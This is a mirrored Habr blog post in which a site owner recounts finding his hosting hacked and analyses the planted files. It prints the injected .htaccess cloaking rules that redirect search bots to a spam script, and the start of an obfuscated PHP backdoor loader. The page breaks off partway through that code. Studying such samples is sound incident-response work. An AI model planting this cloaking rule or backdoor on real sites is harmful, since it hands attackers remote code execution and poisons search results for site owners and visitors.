<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134931760-1"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134931760-1');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>Hello everyone, I am a webmaster and I was hacked</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="Good day Habr, 

 The title of course lies, I'm not a webmaster. More precisely, I can not call them after what happened. I will talk about how my hos...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
  <script>
       (adsbygoogle = window.adsbygoogle || []).push({
            google_ad_client: "ca-pub-6974184241884155",
            enable_page_level_ads: true
       });
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly.github.io/index.html"></a>
    <div class="page-header-text">Geekly Articles each Day</div>
  </header>
  <nav class="page-headings-container js-page-headings-container"></nav>
  <div class="tools-bar js-tools-bar">
    <!-- <a href="../../search.html" title="Search">üîé</a> -->
    <a class="js-list-of-headings-button" data-state="closed" href="#" title="Headings">üìú</a>
    <a class="js-go-to-top-button" href="#" title="Go to Top">‚¨ÜÔ∏è</a>
    <a class="js-go-to-bottom-button" href="#" title="Go to Bottom">‚¨áÔ∏è</a>
  </div>
  <a href="http://bit.ly/donateToWeeklyGeekly" class="donate-btn">DONATE</a>
  <section class="page js-page"><h1>Hello everyone, I am a webmaster and I was hacked</h1><div class="post__text post__text-html js-mediator-article"><div style="text-align:center;"><img src="https://habrastorage.org/getpro/habr/post_images/85e/5dc/8e9/85e5dc8e90347e8d8800c0e1f933b930.jpg"></div><br><br>  Good day Habr, <br><br>  The title of course lies, I'm not a webmaster.  More precisely, I can not call them after what happened.  I will talk about how my hosting was hacked and how I overlooked this event, having noticed only by chance, as well as a little investigation.  I hope my experience will be useful.  Anyone interested, welcome under cat. <br><a name="habracut"></a><br><h1>  As it turned out </h1><br>  I found out about the hacking completely by chance, because  All sites on the hosting worked, opened and looked appropriately decent pages, without too much content.  It should be noted that before that I had never used Google Search Console, but only connected Google Analytics.  But having created the next page, I decided to try the tool.  And so, Search Console is connected to the site and it's time to look at what it can do. 
      <br>
        <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
        <ins class="adsbygoogle"
          style="display:block; text-align:center;"
          data-ad-layout="in-article"
          data-ad-format="fluid"
          data-ad-client="ca-pub-6974184241884155"
          data-ad-slot="8945601208"></ins>
        <script>
          (adsbygoogle = window.adsbygoogle || []).push({});
        </script>
      <br>
      One of the functions of the console is Fetch as Google, that is, the launch of a Google bot on the pages of the site, and I immediately let it onto the main site.  And then I did not understand anything ... the page opens from the browser, and the bot writes that the page was not found.  Something is wrong here, I thought, but I continued to launch the bot, naively believing that Google‚Äôs bot had broken. <br><br><div style="text-align:center;"><img src="https://habrastorage.org/getpro/habr/post_images/3b5/03e/113/3b503e113c2f3a73987071fa2f17f469.png"></div><br><h1>  We understand what happened </h1><br>  Since Search Console does not provide detailed information about the error (which is very sad, in my opinion), I used the <a href="http://web-sniffer.net/">http://web-sniffer.net</a> service to emulate the work of the Googlebot and at the same time check if the site is visible from another point on the planet.  I set the site *******. **, which should open a single <b>index.php</b> file, drove a captcha and received this very page 404. <br><br><pre><code class="html hljs xml"><span class="hljs-meta"><span class="hljs-meta">&lt;!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">html</span></span></span><span class="hljs-tag">&gt;</span></span><span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">head</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">title</span></span></span><span class="hljs-tag">&gt;</span></span>404 Not Found<span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">title</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">head</span></span></span><span class="hljs-tag">&gt;</span></span><span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">body</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">h1</span></span></span><span class="hljs-tag">&gt;</span></span>Not Found<span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">h1</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">p</span></span></span><span class="hljs-tag">&gt;</span></span>The requested URL //bootlegger-limiter.php was not found on this server.<span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">p</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">p</span></span></span><span class="hljs-tag">&gt;</span></span>Additionally, a 500 Internal Server Error error was encountered while trying to use an ErrorDocument to handle the request.<span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">p</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">hr</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">address</span></span></span><span class="hljs-tag">&gt;</span></span>Apache Server at *******.** Port 80<span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">address</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">body</span></span></span><span class="hljs-tag">&gt;</span></span><span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">html</span></span></span><span class="hljs-tag">&gt;</span></span></code> </pre> <br>  What other <b>bootlegger-limiter.php</b> I thought and quickly connected to the hosting.  The fact is that the site *******. ** lies in the subdirectory of the main site (which is in the root).  And I really found in the root of <b>bootlegger-limiter.php</b> .  And the bot redirected, apparently, Apache.  Opened <b>.htaccess</b> , and there added the following lines: <br><br><pre> <code class="apache hljs"><span class="hljs-attribute"><span class="hljs-nomarkup"><span class="hljs-attribute"><span class="hljs-nomarkup">RewriteEngine</span></span></span></span> <span class="hljs-literal"><span class="hljs-literal">on</span></span> RewriteCond <span class="hljs-variable"><span class="hljs-variable">%{ENV:REDIRECT_STATUS}</span></span> 200 RewriteRule ^ -<span class="hljs-meta"><span class="hljs-meta"> [L] RewriteCond %{HTTP_USER_AGENT} (google|yahoo|msn|aol|bing) [OR] RewriteCond %{HTTP_REFERER} (google|yahoo|msn|aol|bing) RewriteRule ^(.*)$ bootlegger-limiter.php?$1 [L]</span></span></code> </pre> <br><br>  In other words, search bots and people who came to the site from search engines showed the page processed in <b>bootlegger-limiter.php</b> . <br><br>  What a twist.  I decided to look for the sake of interest that they showed.  Scored in google "site: *******. **": <br><br><div style="text-align:center;"><img src="https://habrastorage.org/getpro/habr/post_images/515/24b/1ed/51524b1edb730f3798fe52c067ced577.png"></div><br>  Ok Google, everything is clear.  I was slightly surprised that the Google bot does not check the difference in the contents of the received with the HTTP headers of the bot and the chrome browser, for example.  But maybe I'm wrong and it is checked, so the inscription appeared that the site was probably hacked. <br><br>  In such a simple way you can compromise the site in search engines, and the unsuspecting owner may not notice this.  I do not know exactly how the hosting was hacked, because  it does not hang sites using CMS.  The only site with a popular framework was on Yii, but apparently it has nothing to do with it, because  according to the method, it seems that everything was done automatically, and the said framework is difficult to crack without knowing the structure of the site.  As it seems to me, the password from my account is just running.  Below I will tell you what files they planted on me and what function they performed. <br><br><h1>  Debriefing worm </h1><br>  So, to begin with the list of cuckoo executable files when they were thrown up and their content: <br><br><div class="spoiler">  <b class="spoiler_title">kfcgmxuu.php - April 3, 2016</b> <div class="spoiler_text"><pre> <code class="php hljs"><span class="hljs-meta"><span class="hljs-meta">&lt;?php</span></span> $catie =<span class="hljs-string"><span class="hljs-string">'v]falreE'</span></span>; $greatly= <span class="hljs-string"><span class="hljs-string">'eae'</span></span>;$formulation = <span class="hljs-string"><span class="hljs-string">'('</span></span>; $centralization = <span class="hljs-string"><span class="hljs-string">'sSLuVSQ_V'</span></span>; $gummy = <span class="hljs-string"><span class="hljs-string">'a'</span></span>;$barrages = <span class="hljs-string"><span class="hljs-string">')'</span></span>;$lawyer= <span class="hljs-string"><span class="hljs-string">';]s]L'</span></span>; $craw = <span class="hljs-string"><span class="hljs-string">'_'</span></span>; $maisey =<span class="hljs-string"><span class="hljs-string">'yV]tdiVv'</span></span>; $juliann=<span class="hljs-string"><span class="hljs-string">'T'</span></span>; $bridges= <span class="hljs-string"><span class="hljs-string">'R'</span></span>; $betoken= <span class="hljs-string"><span class="hljs-string">'$'</span></span>;$atheists=<span class="hljs-string"><span class="hljs-string">'R'</span></span>;$eustacia = <span class="hljs-string"><span class="hljs-string">'^'</span></span>; $bunting = <span class="hljs-string"><span class="hljs-string">'HaSI'</span></span>;$hurleigh =<span class="hljs-string"><span class="hljs-string">'Rc'</span></span>;$lovingly =<span class="hljs-string"><span class="hljs-string">')n"th'</span></span>; $cups = <span class="hljs-string"><span class="hljs-string">'et'</span></span>; $javelin= <span class="hljs-string"><span class="hljs-string">'i'</span></span>;$lizard= <span class="hljs-string"><span class="hljs-string">'('</span></span>; $chances = <span class="hljs-string"><span class="hljs-string">'=ej_i'</span></span>; $leghorn= <span class="hljs-string"><span class="hljs-string">'fVRcpr'</span></span>; $finalized= <span class="hljs-string"><span class="hljs-string">'('</span></span>; $expounded=<span class="hljs-string"><span class="hljs-string">')V'</span></span>; $bounties=<span class="hljs-string"><span class="hljs-string">'Y'</span></span>; $bushwhack = <span class="hljs-string"><span class="hljs-string">'c'</span></span>;$big= <span class="hljs-string"><span class="hljs-string">'s6t'</span></span>;$dragging =<span class="hljs-string"><span class="hljs-string">'('</span></span>; $appeasable=<span class="hljs-string"><span class="hljs-string">'r'</span></span>; $frequencies = <span class="hljs-string"><span class="hljs-string">'a'</span></span>; $dolphins =<span class="hljs-string"><span class="hljs-string">'v_sie"'</span></span>; $dressers=<span class="hljs-string"><span class="hljs-string">'s$VET'</span></span>; $heaved=<span class="hljs-string"><span class="hljs-string">'['</span></span>;$frederique= <span class="hljs-string"><span class="hljs-string">'r'</span></span>; $kettle= <span class="hljs-string"><span class="hljs-string">'T'</span></span>; $fortress =<span class="hljs-string"><span class="hljs-string">'nU'</span></span>; $letting =<span class="hljs-string"><span class="hljs-string">'l'</span></span>;$entrusted=<span class="hljs-string"><span class="hljs-string">'p$i)tE[[e'</span></span>; $ketti=<span class="hljs-string"><span class="hljs-string">'i'</span></span>; $coarsest = <span class="hljs-string"><span class="hljs-string">'S'</span></span>; $ashely =<span class="hljs-string"><span class="hljs-string">'_oZC'</span></span>; $avrom =<span class="hljs-string"><span class="hljs-string">'E'</span></span>; $knower=<span class="hljs-string"><span class="hljs-string">'Te)E:`'</span></span>;$bayonets = <span class="hljs-string"><span class="hljs-string">'a)l($ibi'</span></span>;$keying = <span class="hljs-string"><span class="hljs-string">'K'</span></span>;$availing =<span class="hljs-string"><span class="hljs-string">';'</span></span>;$karmen=<span class="hljs-string"><span class="hljs-string">':T'</span></span>;$ingredient= <span class="hljs-string"><span class="hljs-string">'[g'</span></span>; $coincides = <span class="hljs-string"><span class="hljs-string">'_'</span></span>; $eyesight= <span class="hljs-string"><span class="hljs-string">'v)re'</span></span>; $iterates =<span class="hljs-string"><span class="hljs-string">'r[)_c(E'</span></span>; $dissident=<span class="hljs-string"><span class="hljs-string">'lvek'</span></span>; $discernibility =<span class="hljs-string"><span class="hljs-string">'m'</span></span>; $inclination =<span class="hljs-string"><span class="hljs-string">'(vrs;_,gS'</span></span>;$characterizes =<span class="hljs-string"><span class="hljs-string">'e'</span></span>; $contented= <span class="hljs-string"><span class="hljs-string">'r'</span></span>; $lorrayne= <span class="hljs-string"><span class="hljs-string">'?'</span></span>; $archived=<span class="hljs-string"><span class="hljs-string">'g'</span></span>; $bellowing =<span class="hljs-string"><span class="hljs-string">';'</span></span>; $deferrer= <span class="hljs-string"><span class="hljs-string">'=v(a$,e'</span></span>; $indiana=<span class="hljs-string"><span class="hljs-string">'fta'</span></span>;$krisiun= <span class="hljs-string"><span class="hljs-string">'$a$WbqUT'</span></span>; $gardens= <span class="hljs-string"><span class="hljs-string">'$i"i_i)'</span></span>; $evidenced = <span class="hljs-string"><span class="hljs-string">'srH'</span></span>;$fruitfulness=<span class="hljs-string"><span class="hljs-string">'"'</span></span>;$f=<span class="hljs-string"><span class="hljs-string">'P'</span></span>; $bylaw =<span class="hljs-string"><span class="hljs-string">'ad"v4_ve_'</span></span>;$coriss= <span class="hljs-string"><span class="hljs-string">'(ElspQ'</span></span>; $cots= <span class="hljs-string"><span class="hljs-string">'esImrvq'</span></span>;$lizard =<span class="hljs-string"><span class="hljs-string">'a'</span></span>; $conceived =<span class="hljs-string"><span class="hljs-string">'y'</span></span>;$arabs=<span class="hljs-string"><span class="hljs-string">']eOX'</span></span>;$excretion=<span class="hljs-string"><span class="hljs-string">'tu"u'</span></span>;$harmoniously =<span class="hljs-string"><span class="hljs-string">'r'</span></span>;$figured= <span class="hljs-string"><span class="hljs-string">') '</span></span>;$basful= <span class="hljs-string"><span class="hljs-string">'vP(_'</span></span>; $dapper =<span class="hljs-string"><span class="hljs-string">'o'</span></span>; $asks = <span class="hljs-string"><span class="hljs-string">'ocnes"'</span></span>;$indira =<span class="hljs-string"><span class="hljs-string">'t'</span></span>; $jim =<span class="hljs-string"><span class="hljs-string">'?'</span></span>; $coweringly = <span class="hljs-string"><span class="hljs-string">'$'</span></span>;$incompetent = <span class="hljs-string"><span class="hljs-string">'o'</span></span>; $bitternut = <span class="hljs-string"><span class="hljs-string">'gr'</span></span>;$codes = <span class="hljs-string"><span class="hljs-string">'d'</span></span>;$grasp=<span class="hljs-string"><span class="hljs-string">'qnOe"$se'</span></span>; $arachnids = <span class="hljs-string"><span class="hljs-string">'VI)i(Q'</span></span>;$elucidate =<span class="hljs-string"><span class="hljs-string">'dQa'</span></span>; $husband = $asks[<span class="hljs-string"><span class="hljs-string">'1'</span></span>] .$bitternut[<span class="hljs-string"><span class="hljs-string">'1'</span></span>] .$grasp[<span class="hljs-string"><span class="hljs-string">'7'</span></span>] . $elucidate[<span class="hljs-string"><span class="hljs-string">'2'</span></span>].$indira.$grasp[<span class="hljs-string"><span class="hljs-string">'7'</span></span>].$basful[<span class="hljs-string"><span class="hljs-string">'3'</span></span>] . $indiana[<span class="hljs-number"><span class="hljs-number">0</span></span>].$excretion[<span class="hljs-string"><span class="hljs-string">'3'</span></span>] . $grasp[<span class="hljs-number"><span class="hljs-number">1</span></span>] . $asks[<span class="hljs-string"><span class="hljs-string">'1'</span></span>]. $indira. $arachnids[<span class="hljs-string"><span class="hljs-string">'3'</span></span>].$incompetent. $grasp[<span class="hljs-number"><span class="hljs-number">1</span></span>]; $iggy= $figured[<span class="hljs-string"><span class="hljs-string">'1'</span></span>]; $aspirins= $husband($iggy, $grasp[<span class="hljs-string"><span class="hljs-string">'7'</span></span>] . $basful[<span class="hljs-string"><span class="hljs-string">'0'</span></span>] .$elucidate[<span class="hljs-string"><span class="hljs-string">'2'</span></span>]. $coriss[<span class="hljs-string"><span class="hljs-string">'2'</span></span>]. $arachnids[<span class="hljs-string"><span class="hljs-string">'4'</span></span>]. $elucidate[<span class="hljs-string"><span class="hljs-string">'2'</span></span>] .$bitternut[<span class="hljs-string"><span class="hljs-string">'1'</span></span>] .$bitternut[<span class="hljs-string"><span class="hljs-string">'1'</span></span>] . $elucidate[<span class="hljs-string"><span class="hljs-string">'2'</span></span>] .$conceived. $basful[<span class="hljs-string"><span class="hljs-string">'3'</span></span>] . $coriss[<span class="hljs-string"><span class="hljs-string">'4'</span></span>] .$incompetent.$coriss[<span class="hljs-string"><span class="hljs-string">'4'</span></span>] .$arachnids[<span class="hljs-string"><span class="hljs-string">'4'</span></span>]. $indiana[<span class="hljs-number"><span class="hljs-number">0</span></span>]. $excretion[<span class="hljs-string"><span class="hljs-string">'3'</span></span>].$grasp[<span class="hljs-number"><span class="hljs-number">1</span></span>].$asks[<span class="hljs-string"><span class="hljs-string">'1'</span></span>].$basful[<span class="hljs-string"><span class="hljs-string">'3'</span></span>] .$bitternut[<span class="hljs-number"><span class="hljs-number">0</span></span>] . $grasp[<span class="hljs-string"><span class="hljs-string">'7'</span></span>].$indira .$basful[<span class="hljs-string"><span class="hljs-string">'3'</span></span>] . $elucidate[<span class="hljs-string"><span class="hljs-string">'2'</span></span>] . $bitternut[<span class="hljs-string"><span class="hljs-string">'1'</span></span>]. $bitternut[<span class="hljs-number"><span class="hljs-number">0</span></span>] . $grasp[<span class="hljs-string"><span class="hljs-string">'6'</span></span>] .$arachnids[<span class="hljs-string"><span class="hljs-string">'4'</span></span>]. $arachnids[<span class="hljs-string"><span class="hljs-string">'2'</span></span>] .$arachnids[<span class="hljs-string"><span class="hljs-string">'2'</span></span>] .$arachnids[<span class="hljs-string"><span class="hljs-string">'2'</span></span>]. $bellowing); $aspirins ($indecomposable[<span class="hljs-string"><span class="hljs-string">'1'</span></span>],$bylaw[<span class="hljs-string"><span class="hljs-string">'4'</span></span>] , $arachnids[<span class="hljs-string"><span class="hljs-string">'2'</span></span>],$basful[<span class="hljs-string"><span class="hljs-string">'1'</span></span>], $karmen[<span class="hljs-string"><span class="hljs-string">'0'</span></span>] , $big[<span class="hljs-number"><span class="hljs-number">1</span></span>],$evidenced[<span class="hljs-string"><span class="hljs-string">'2'</span></span>], $coriss[<span class="hljs-string"><span class="hljs-string">'4'</span></span>] ,$arachnids[<span class="hljs-string"><span class="hljs-string">'2'</span></span>] ,$grasp[<span class="hljs-string"><span class="hljs-string">'5'</span></span>]. $arachnids[<span class="hljs-string"><span class="hljs-string">'3'</span></span>].$deferrer[<span class="hljs-string"><span class="hljs-string">'0'</span></span>] . $elucidate[<span class="hljs-string"><span class="hljs-string">'2'</span></span>] .$bitternut[<span class="hljs-string"><span class="hljs-string">'1'</span></span>].$bitternut[<span class="hljs-string"><span class="hljs-string">'1'</span></span>].$elucidate[<span class="hljs-string"><span class="hljs-string">'2'</span></span>]. $conceived .$basful[<span class="hljs-string"><span class="hljs-string">'3'</span></span>]. $cots[<span class="hljs-string"><span class="hljs-string">'3'</span></span>] .$grasp[<span class="hljs-string"><span class="hljs-string">'7'</span></span>].$bitternut[<span class="hljs-string"><span class="hljs-string">'1'</span></span>] . $bitternut[<span class="hljs-number"><span class="hljs-number">0</span></span>] . $grasp[<span class="hljs-string"><span class="hljs-string">'7'</span></span>] . $arachnids[<span class="hljs-string"><span class="hljs-string">'4'</span></span>] .$grasp[<span class="hljs-string"><span class="hljs-string">'5'</span></span>]. $basful[<span class="hljs-string"><span class="hljs-string">'3'</span></span>].$leghorn[<span class="hljs-string"><span class="hljs-string">'2'</span></span>] .$coriss[<span class="hljs-string"><span class="hljs-string">'1'</span></span>] . $elucidate[<span class="hljs-string"><span class="hljs-string">'1'</span></span>]. $krisiun[<span class="hljs-string"><span class="hljs-string">'6'</span></span>] . $coriss[<span class="hljs-string"><span class="hljs-string">'1'</span></span>] .$inclination[<span class="hljs-string"><span class="hljs-string">'8'</span></span>] .$krisiun[<span class="hljs-string"><span class="hljs-string">'7'</span></span>] .$deferrer[<span class="hljs-string"><span class="hljs-string">'5'</span></span>] . $grasp[<span class="hljs-string"><span class="hljs-string">'5'</span></span>] . $basful[<span class="hljs-string"><span class="hljs-string">'3'</span></span>] .$ashely[<span class="hljs-string"><span class="hljs-string">'3'</span></span>].$grasp[<span class="hljs-string"><span class="hljs-string">'2'</span></span>] . $grasp[<span class="hljs-string"><span class="hljs-string">'2'</span></span>]. $keying.$arachnids[<span class="hljs-number"><span class="hljs-number">1</span></span>] . $coriss[<span class="hljs-string"><span class="hljs-string">'1'</span></span>]. $deferrer[<span class="hljs-string"><span class="hljs-string">'5'</span></span>] . $grasp[<span class="hljs-string"><span class="hljs-string">'5'</span></span>]. $basful[<span class="hljs-string"><span class="hljs-string">'3'</span></span>]. $inclination[<span class="hljs-string"><span class="hljs-string">'8'</span></span>]. $coriss[<span class="hljs-string"><span class="hljs-string">'1'</span></span>] . $leghorn[<span class="hljs-string"><span class="hljs-string">'2'</span></span>].$arachnids[<span class="hljs-string"><span class="hljs-string">'0'</span></span>].$coriss[<span class="hljs-string"><span class="hljs-string">'1'</span></span>]. $leghorn[<span class="hljs-string"><span class="hljs-string">'2'</span></span>] .$arachnids[<span class="hljs-string"><span class="hljs-string">'2'</span></span>]. $bellowing . $grasp[<span class="hljs-string"><span class="hljs-string">'5'</span></span>].$elucidate[<span class="hljs-string"><span class="hljs-string">'2'</span></span>] . $deferrer[<span class="hljs-string"><span class="hljs-string">'0'</span></span>]. $arachnids[<span class="hljs-string"><span class="hljs-string">'3'</span></span>] . $grasp[<span class="hljs-string"><span class="hljs-string">'6'</span></span>] . $grasp[<span class="hljs-string"><span class="hljs-string">'6'</span></span>] . $grasp[<span class="hljs-string"><span class="hljs-string">'7'</span></span>] .$indira .$arachnids[<span class="hljs-string"><span class="hljs-string">'4'</span></span>] . $grasp[<span class="hljs-string"><span class="hljs-string">'5'</span></span>].$arachnids[<span class="hljs-string"><span class="hljs-string">'3'</span></span>]. $iterates[<span class="hljs-number"><span class="hljs-number">1</span></span>] .$grasp[<span class="hljs-string"><span class="hljs-string">'4'</span></span>]. $grasp[<span class="hljs-string"><span class="hljs-string">'7'</span></span>].$coriss[<span class="hljs-string"><span class="hljs-string">'2'</span></span>]. $basful[<span class="hljs-string"><span class="hljs-string">'0'</span></span>]. $arachnids[<span class="hljs-string"><span class="hljs-string">'3'</span></span>].$basful[<span class="hljs-string"><span class="hljs-string">'0'</span></span>] . $grasp[<span class="hljs-string"><span class="hljs-string">'6'</span></span>] . $basful[<span class="hljs-string"><span class="hljs-string">'0'</span></span>]. $grasp[<span class="hljs-string"><span class="hljs-string">'0'</span></span>]. $grasp[<span class="hljs-string"><span class="hljs-string">'4'</span></span>]. $arabs[<span class="hljs-number"><span class="hljs-number">0</span></span>] . $arachnids[<span class="hljs-string"><span class="hljs-string">'2'</span></span>].$jim .$grasp[<span class="hljs-string"><span class="hljs-string">'5'</span></span>]. $arachnids[<span class="hljs-string"><span class="hljs-string">'3'</span></span>] .$iterates[<span class="hljs-number"><span class="hljs-number">1</span></span>]. $grasp[<span class="hljs-string"><span class="hljs-string">'4'</span></span>] . $grasp[<span class="hljs-string"><span class="hljs-string">'7'</span></span>] . $coriss[<span class="hljs-string"><span class="hljs-string">'2'</span></span>].$basful[<span class="hljs-string"><span class="hljs-string">'0'</span></span>] .$arachnids[<span class="hljs-string"><span class="hljs-string">'3'</span></span>].$basful[<span class="hljs-string"><span class="hljs-string">'0'</span></span>]. $grasp[<span class="hljs-string"><span class="hljs-string">'6'</span></span>]. $basful[<span class="hljs-string"><span class="hljs-string">'0'</span></span>] . $grasp[<span class="hljs-string"><span class="hljs-string">'0'</span></span>] . $grasp[<span class="hljs-string"><span class="hljs-string">'4'</span></span>]. $arabs[<span class="hljs-number"><span class="hljs-number">0</span></span>] . $karmen[<span class="hljs-string"><span class="hljs-string">'0'</span></span>] .$arachnids[<span class="hljs-string"><span class="hljs-string">'4'</span></span>]. $arachnids[<span class="hljs-string"><span class="hljs-string">'3'</span></span>] . $grasp[<span class="hljs-string"><span class="hljs-string">'6'</span></span>] .$grasp[<span class="hljs-string"><span class="hljs-string">'6'</span></span>] .$grasp[<span class="hljs-string"><span class="hljs-string">'7'</span></span>].$indira. $arachnids[<span class="hljs-string"><span class="hljs-string">'4'</span></span>] . $grasp[<span class="hljs-string"><span class="hljs-string">'5'</span></span>] . $arachnids[<span class="hljs-string"><span class="hljs-string">'3'</span></span>].$iterates[<span class="hljs-number"><span class="hljs-number">1</span></span>]. $grasp[<span class="hljs-string"><span class="hljs-string">'4'</span></span>] . $evidenced[<span class="hljs-string"><span class="hljs-string">'2'</span></span>]. $krisiun[<span class="hljs-string"><span class="hljs-string">'7'</span></span>] . $krisiun[<span class="hljs-string"><span class="hljs-string">'7'</span></span>] . $basful[<span class="hljs-string"><span class="hljs-string">'1'</span></span>]. $basful[<span class="hljs-string"><span class="hljs-string">'3'</span></span>].$coriss[<span class="hljs-string"><span class="hljs-string">'1'</span></span>] . $lawyer[<span class="hljs-string"><span class="hljs-string">'4'</span></span>] . $arachnids[<span class="hljs-string"><span class="hljs-string">'0'</span></span>].$arachnids[<span class="hljs-number"><span class="hljs-number">1</span></span>]. $arachnids[<span class="hljs-string"><span class="hljs-string">'0'</span></span>] .$inclination[<span class="hljs-string"><span class="hljs-string">'8'</span></span>] . $arachnids[<span class="hljs-string"><span class="hljs-string">'0'</span></span>] . $elucidate[<span class="hljs-string"><span class="hljs-string">'1'</span></span>]. $grasp[<span class="hljs-string"><span class="hljs-string">'4'</span></span>] . $arabs[<span class="hljs-number"><span class="hljs-number">0</span></span>] .$arachnids[<span class="hljs-string"><span class="hljs-string">'2'</span></span>]. $jim. $grasp[<span class="hljs-string"><span class="hljs-string">'5'</span></span>] . $arachnids[<span class="hljs-string"><span class="hljs-string">'3'</span></span>]. $iterates[<span class="hljs-number"><span class="hljs-number">1</span></span>].$grasp[<span class="hljs-string"><span class="hljs-string">'4'</span></span>] . $evidenced[<span class="hljs-string"><span class="hljs-string">'2'</span></span>].$krisiun[<span class="hljs-string"><span class="hljs-string">'7'</span></span>] .$krisiun[<span class="hljs-string"><span class="hljs-string">'7'</span></span>].$basful[<span class="hljs-string"><span class="hljs-string">'1'</span></span>] . $basful[<span class="hljs-string"><span class="hljs-string">'3'</span></span>] . $coriss[<span class="hljs-string"><span class="hljs-string">'1'</span></span>].$lawyer[<span class="hljs-string"><span class="hljs-string">'4'</span></span>] . $arachnids[<span class="hljs-string"><span class="hljs-string">'0'</span></span>]. $arachnids[<span class="hljs-number"><span class="hljs-number">1</span></span>] .$arachnids[<span class="hljs-string"><span class="hljs-string">'0'</span></span>]. $inclination[<span class="hljs-string"><span class="hljs-string">'8'</span></span>] .$arachnids[<span class="hljs-string"><span class="hljs-string">'0'</span></span>] .$elucidate[<span class="hljs-string"><span class="hljs-string">'1'</span></span>].$grasp[<span class="hljs-string"><span class="hljs-string">'4'</span></span>] .$arabs[<span class="hljs-number"><span class="hljs-number">0</span></span>]. $karmen[<span class="hljs-string"><span class="hljs-string">'0'</span></span>] .$elucidate[<span class="hljs-string"><span class="hljs-string">'0'</span></span>] . $arachnids[<span class="hljs-string"><span class="hljs-string">'3'</span></span>]. $grasp[<span class="hljs-string"><span class="hljs-string">'7'</span></span>] .$arachnids[<span class="hljs-string"><span class="hljs-string">'2'</span></span>] . $bellowing. $grasp[<span class="hljs-string"><span class="hljs-string">'7'</span></span>] . $basful[<span class="hljs-string"><span class="hljs-string">'0'</span></span>] .$elucidate[<span class="hljs-string"><span class="hljs-string">'2'</span></span>] . $coriss[<span class="hljs-string"><span class="hljs-string">'2'</span></span>]. $arachnids[<span class="hljs-string"><span class="hljs-string">'4'</span></span>]. $grasp[<span class="hljs-string"><span class="hljs-string">'6'</span></span>]. $indira. $bitternut[<span class="hljs-string"><span class="hljs-string">'1'</span></span>] . $bitternut[<span class="hljs-string"><span class="hljs-string">'1'</span></span>]. $grasp[<span class="hljs-string"><span class="hljs-string">'7'</span></span>] . $basful[<span class="hljs-string"><span class="hljs-string">'0'</span></span>]. $arachnids[<span class="hljs-string"><span class="hljs-string">'4'</span></span>] . $krisiun[<span class="hljs-string"><span class="hljs-string">'4'</span></span>] .$elucidate[<span class="hljs-string"><span class="hljs-string">'2'</span></span>] . $grasp[<span class="hljs-string"><span class="hljs-string">'6'</span></span>] . $grasp[<span class="hljs-string"><span class="hljs-string">'7'</span></span>]. $big[<span class="hljs-number"><span class="hljs-number">1</span></span>].$bylaw[<span class="hljs-string"><span class="hljs-string">'4'</span></span>] .$basful[<span class="hljs-string"><span class="hljs-string">'3'</span></span>]. $elucidate[<span class="hljs-string"><span class="hljs-string">'0'</span></span>] . $grasp[<span class="hljs-string"><span class="hljs-string">'7'</span></span>]. $asks[<span class="hljs-string"><span class="hljs-string">'1'</span></span>]. $incompetent . $elucidate[<span class="hljs-string"><span 